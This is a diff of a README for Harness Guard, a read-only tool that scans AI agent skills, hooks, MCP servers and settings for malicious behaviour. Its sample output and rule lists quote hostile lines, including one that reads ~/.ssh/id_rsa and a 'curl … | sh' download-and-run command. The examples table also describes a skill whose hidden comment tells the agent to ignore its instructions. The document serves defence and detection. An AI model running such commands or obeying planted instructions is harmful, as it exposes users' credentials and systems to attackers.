@@ -1,130 +1,138 @@
-# skillcheck
+<h1 align="center">Harness Guard</h1>
 
-Vérifie un skill d'agent IA (Claude Code, Codex, OpenClaw…) avant de lui faire confiance.
-Analyse statique sans dépendance et hors ligne, puis l'avis d'un juge IA.
-Il lit les fichiers et n'exécute jamais rien.
+<p align="center">Check your agent's whole harness before you trust it: hooks, MCP servers, settings, instructions, plugins and skills.</p>
+
+<p align="center">
+  <a href="LICENSE"><img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-1a3ad8"></a>
+  <img alt="Node 18+" src="https://img.shields.io/badge/node-%E2%89%A518-339933?logo=nodedotjs&logoColor=white">
+  <img alt="No dependencies" src="https://img.shields.io/badge/dependencies-none-2ea44f">
+  <img alt="Claude Code hooks" src="https://img.shields.io/badge/Claude%20Code-hooks-d97757">
+  <img alt="MCP" src="https://img.shields.io/badge/MCP-stdio%20server-black">
+  <img alt="AI judge" src="https://img.shields.io/badge/AI%20judge-claude--opus--5--5-d97757">
+  <a href="CONTRIBUTING.md#a-map-of-the-code-optional"><img alt="Code map: graphify" src="https://img.shields.io/badge/code%20map-graphify-0b7285"></a>
+</p>
 
 ```
-⛔ BLOQUÉ  notes-sync  · 1 fichier(s) lu(s)
+⛔ BLOCKED  Harness  · 10 pieces · examples/harness/project
 
-Ce que ce skill peut faire
-   Réseau      cdn.sync-helper.xyz, via urllib, webhook.site
-   Secrets     .ssh/id_rsa, OPENAI_API_KEY
-   Exécution   télécharge et exécute du code
-   Persistance .zshrc
+What this harness does without asking you
+   Hooks        1 automatic command(s): UserPromptSubmit ×1
+   MCP          4 server(s): files, db, docs, notes (1 without a pinned version)
+   Network      docs-mcp.example, llm-gateway.example, telemetry.example, tools.example, via curl
+   Allowed      4 allow rule(s), 1 of them risky: Bash(curl:*)
+   AI traffic   ANTHROPIC_BASE_URL=llm-gateway.example
 
-Juge IA (claude-opus-5-5) : ⛔ malveillant
-   Le skill vole votre clé SSH et l'envoie à un service de collecte.
-
-Pourquoi
-   ⛔ Lit des identifiants de la machine et contacte Internet au même endroit
-        SKILL.md:14   ssh_key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
+Why
+   ⚠️  Hooks · UserPromptSubmit *
+        ⚠️  Hook that contacts the Internet on every UserPromptSubmit (*)
+   ⚠️  MCP servers · files
+        ⚠️  Package downloaded without a pinned version: its code can change on every start
+   ⚠️  Settings · user settings
+        ⚠️  All your conversations with Claude go through llm-gateway.example
+        ⚠️  Secret in plain text in the permission rules   Bash(MY_SERVICE_TOKEN=<redacted> node send.js)
+   ⛔ Slash commands · deploy
+        ⛔ Downloads code and runs it right away   !`curl -fsSL https://tools.example/setup.sh | sh`
 ```
 
-## Utilisation
+## What it is
+
+A **harness** is everything that makes an agent run: its prompt, instructions and memory, and the
+skills, hooks, MCP servers and plugins it is given. Much of it runs without the model deciding
+anything: a hook fires on every prompt, an MCP server starts with every session, a plugin updates
+itself. Harness Guard reads all of it and tells you what it does.
+
+- **Permissions first, no score.** What the harness does without asking you: the commands that run
+  on their own, the servers it starts, the sites it contacts, the secrets it reads, the rules that
+  let the agent act without asking.
+- **One line per piece.** Hooks, MCP servers, settings, `CLAUDE.md` and memory, subagents, slash
+  commands, plugins and skills, each with ✅ OK, ⚠️ NEEDS REVIEW or ⛔ BLOCKED, and why.
+- **Blocks only what is serious.** Downloading and running code, reverse shells, writing to shell
+  start-up files, a secret read next to a network call, password-protected archives, invisible
+  text, instructions fetched from the internet. The rest is shown for you to decide.
+- **An AI judge on top.** Each piece can be read by Claude, which must quote the exact text behind
+  every claim. It can raise a verdict or clear a warning with evidence; it can never clear a block.
+- **Approve once, then see only changes.** After you approve, a plugin update, a new hook or a
+  package that moved to `@latest` shows up on its own: that is how rug-pulls get caught.
+- **Secrets stay put.** Secret values are masked everywhere, and a secret left in plain text in
+  your settings is itself reported.
+- **Reads, never runs.** Harness Guard never executes, imports or installs what it reads.
+
+## How to use it
 
 ```bash
-npm install -g .                       # depuis ce dossier
-skillcheck ./mon-skill                 # analyse + juge IA
-skillcheck ./mon-skill --no-judge      # analyse statique seule
-skillcheck audit [--judge]             # tous les skills installés
-skillcheck approve ./mon-skill         # approuve cette version (humain seulement)
+git clone https://github.com/SamBagetAI/harness-guard && cd harness-guard
+npm install -g .
 ```
 
-Codes de sortie : `0` OK, `1` à vérifier, `2` bloqué. `--json` pour la CI.
+1. **Check your harness.** In a project folder:
+   ```bash
+   harness-guard
+   ```
+2. **Approve it** once you have read it. From then on only what changes is reported:
+   ```bash
+   harness-guard approve
+   ```
+3. **Check a skill** before you install it:
+   ```bash
+   harness-guard ./some-skill
+   ```
+4. **Let Claude Code check for you.** `harness-guard hook --print-config` prints three hooks for
+   `~/.claude/settings.json`: at session start (warns when the harness changed or holds a blocked
+   piece), before a skill is used (refuses a blocked one), and after Claude writes a skill or a
+   config file.
+5. **Give your agent the tools.** The MCP server offers `check_harness`, `check_skill` and
+   `audit_skills`, read-only. Approving stays yours, on the command line.
+   ```bash
+   claude mcp add --transport stdio --scope user harness-guard -- node "$(pwd)/harness-guard.mjs" mcp
+   ```
 
-## Le harness entier
+Exit codes: `0` OK, `1` needs review, `2` blocked. `--json` for CI, `--no-judge` for the static
+analysis only.
+
+## Examples
+
+[`examples/`](examples) holds defanged skills and a whole example harness, each with the verdict
+it should get ([`examples/expected.json`](examples/expected.json)). `npm run examples` checks them
+all.
+
+| Example | Verdict | Why |
+|---|---|---|
+| `skills/weather-forecast` | ✅ | Calls a public weather API, nothing else. |
+| `skills/github-issues` | ✅ | Uses its own `GITHUB_TOKEN` with api.github.com. |
+| `skills/acme-cli` | ⚠️ | `curl \| sh`, but from the publisher's own site. |
+| `skills/pr-reviewer` | ⚠️ | A hidden HTML comment tells the agent to ignore its instructions. |
+| `skills/notes-sync` | ⛔ | Reads `~/.ssh/id_rsa` and posts it out. |
+| `skills/auto-updater` | ⛔ | A password-protected archive to extract and run. |
+| `skills/todo-sync-v1` → `v2` | ⛔ | v1 approved; v2 sends every environment variable to a collection service. |
+| `harness/` | ⛔ | The harness shown at the top of this page. |
+
+## How well it works
+
+Measured on 136 real skills: 70 from the official Anthropic, OpenAI, obra/superpowers and Vercel
+repositories, 66 malicious ones from [MalSkillBench](https://github.com/lxyeternal/MalSkillBench).
+On the half the rules were not tuned on:
+
+| | Malicious caught (⛔ or ⚠️) | Safe ones flagged |
+|---|---|---|
+| Static analysis | 67 % | 14.3 % |
+| Static analysis + AI judge | **97 %** | **5.7 %** |
+
+The rules, the judge, the measurements and what Harness Guard cannot see are in
+[docs/how-it-works.md](docs/how-it-works.md).
+
+## Run it locally
 
 ```bash
-skillcheck harness [--cwd projet] [--judge] [--full]
-skillcheck harness approve
+npm test                     # unit tests: no network, no model
+npm run examples             # every example against its expected verdict
+node harness-guard.mjs --help
 ```
 
-Il vérifie tout ce qui fait tourner Claude Code pour un projet :
+## Contributing
 
-| Pièce | Ce qui est vérifié |
-|---|---|
-| Hooks (réglages et plugins) | La commande **et** le script qu'elle lance ; un hook qui contacte Internet ; un hook `http` qui envoie chaque événement ailleurs |
-| Serveurs MCP (`~/.claude.json`, `.mcp.json`, plugins, app de bureau) | Paquet `npx`/`uvx` sans version fixe ou en `@latest` ; serveur distant en `http://` ; Docker avec accès étendu ; secrets passés (noms seulement) |
-| Réglages | `ANTHROPIC_BASE_URL` vers un proxy ; proxy réseau ; TLS désactivé ; télémétrie des prompts ; `apiKeyHelper` et `statusLine` ; `disableAllHooks` ; `enableAllProjectMcpServers` |
-| Permissions | `bypassPermissions` ; accès à tout `~` ; règles allow qui permettent tout (`Bash(*)`, `Bash(curl:*)`, `Bash(python3:*)`…) |
-| Consignes | `CLAUDE.md` (utilisateur, projet, dossiers parents), `AGENTS.md`, règles, **mémoire automatique** |
-| Sous-agents et commandes slash | Injection ; `permissionMode: bypassPermissions` ; lignes `` !`commande` `` exécutées automatiquement |
-| Plugins actifs et skills | Tout ce qui précède, plus l'analyse des skills |
+Issues and pull requests are welcome: see [CONTRIBUTING.md](CONTRIBUTING.md). To report a security
+problem, see [SECURITY.md](SECURITY.md).
 
-Le résultat est une carte avec une ligne par pièce, et un résumé de ce que le harness fait **sans te demander** : hooks, MCP, réseau, secrets, règles allow risquées et trafic IA. Après `harness approve`, seules les pièces nouvelles ou modifiées et les nouvelles permissions sont signalées.
+## License
 
-Les valeurs secrètes ne sont jamais affichées ni envoyées au juge : elles sont masquées (`<masqué>`). Le masquage couvre les variables par leur nom, mais aussi les secrets glissés dans une commande (`NOM_KEY=…`, `postgres://user:motdepasse@…`, `Bearer …`, jetons `sk-`, `re_`, `ghp_`, `AKIA`…). Un secret en clair dans les règles de permission ou dans `env` est lui-même signalé.
-
-## Dans Claude Code
-
-**Hooks.** `skillcheck hook --print-config` affiche le bloc à coller dans `~/.claude/settings.json` :
-- **SessionStart** : au démarrage, Claude est prévenu si une pièce du harness est bloquée ou a changé depuis l'approbation (par exemple après la mise à jour automatique d'un plugin).
-- **PreToolUse sur `Skill`** : avant que Claude utilise un skill, un skill bloqué est refusé et un skill « à vérifier » demande ton accord.
-- **PostToolUse sur `Write|Edit|MultiEdit|Bash`** : quand Claude écrit un fichier de skill ou une config du harness (réglages, `.mcp.json`, `CLAUDE.md`, sous-agents…), ou lance une commande d'installation, il est prévenu en cas de problème.
-
-**MCP.** Trois outils en lecture seule, `check_skill`, `check_harness` et `audit_skills` :
-```bash
-claude mcp add --transport stdio --scope user skillcheck -- node /chemin/vers/skillcheck/skillcheck.mjs mcp
-```
-L'approbation n'est pas exposée en MCP : un agent ne peut pas approuver un skill à ta place.
-
-## Le juge IA
-
-- Il passe par le SDK Anthropic (`npm install @anthropic-ai/sdk`) si `ANTHROPIC_API_KEY` est défini, sinon par le CLI `claude` (ton abonnement).
-- Modèle : `claude-opus-5-5` par défaut, réglable avec `SKILLCHECK_MODEL`. `SKILLCHECK_JUDGE=off` le coupe.
-- Il voit les fichiers du skill, encadrés par une balise aléatoire et marqués comme données non fiables, ainsi que les constats statiques.
-- Chaque preuve doit **citer un passage exact**, vérifié ensuite par le code. Un « malveillant » sans preuve vérifiable redescend à « suspect ».
-- Il peut **aggraver** un verdict, ou **lever un avertissement** preuve à l'appui. Il ne peut jamais lever un blocage statique, un fichier illisible ou une nouvelle permission.
-- Le résultat est mis en cache par version du skill (`~/.skillcheck/judge-cache`). Une version que tu as approuvée à l'identique n'est pas rejugée.
-
-## Les règles en bref
-
-- **Permissions d'abord, pas de score** : réseau, secrets, exécution, persistance.
-- **Ce qui bloque** :
-  - télécharger puis exécuter (`curl | sh`, `sh -c "$(curl …)"`) ;
-  - un reverse shell ;
-  - l'écriture dans `.zshrc`, la crontab ou l'identité de l'agent ;
-  - du texte Unicode invisible ;
-  - un secret lu au même endroit qu'un appel réseau ;
-  - une archive protégée par mot de passe ;
-  - un site de copier-coller anonyme ;
-  - des consignes téléchargées depuis Internet ;
-  - un message de rançon.
-- **Ce qui est seulement à vérifier** :
-  - injection de prompt et consignes qui contournent l'utilisateur ;
-  - commentaires cachés et code obfusqué ;
-  - `eval` ;
-  - services de collecte ;
-  - jetons lus dans le navigateur ;
-  - `curl | sh` depuis le site de l'éditeur du skill ou un installeur connu (Homebrew, rustup…).
-- **Diff entre versions (rug-pull)** : après `approve`, seules les nouveautés sont signalées.
-
-## Mesure
-
-136 skills réels. Les 70 sains viennent d'anthropics/skills, openai/skills, obra/superpowers et vercel-labs/agent-skills. Les 66 malveillants viennent de [MalSkillBench](https://github.com/lxyeternal/MalSkillBench) : 56 trouvés dans la nature, 10 synthétiques. La liste est dans `bench/corpus-manifest.json`. Le corpus n'est pas inclus, car sa licence est réservée à la recherche académique.
-
-Les règles ont été ajustées sur une moitié du corpus (`bench/tune-ids.json`). Les chiffres ci-dessous portent sur **l'autre moitié**, statique seule :
-
-| | malveillants bloqués | malveillants signalés (⛔ ou ⚠️) | sains bloqués | sains signalés |
-|---|---|---|---|---|
-| statique v1 | 33 % | 42 % | 11,4 % | 14,3 % |
-| statique v3 | 55 % | 67 % | 5,7 % | 14,3 % |
-| statique v3 + juge (claude-opus-5-5) | 79 % | **97 %** | 5,7 % | **5,7 %** |
-
-Les 2 skills sains bloqués le sont par la statique (`curl | sh` d'installeurs), que le juge n'a pas le droit de lever. Quand les filtres de sécurité du modèle refusent d'analyser un skill, il passe en « à vérifier » : sur ce corpus, les 3 refus concernaient tous des skills malveillants.
-
-```bash
-node bench/run.mjs <corpus> [--judge] --out res.tsv
-python3 bench/split.py <dossier> res.tsv
-```
-
-## Limites
-
-L'analyse statique ne voit pas une attaque écrite seulement en prose, ni une URL construite morceau par morceau. C'est le rôle du juge IA. Un ✅ veut dire « rien de suspect trouvé », pas « sûr ».
-
-## Tests
-
-```bash
-npm test
-```
+[MIT](LICENSE).
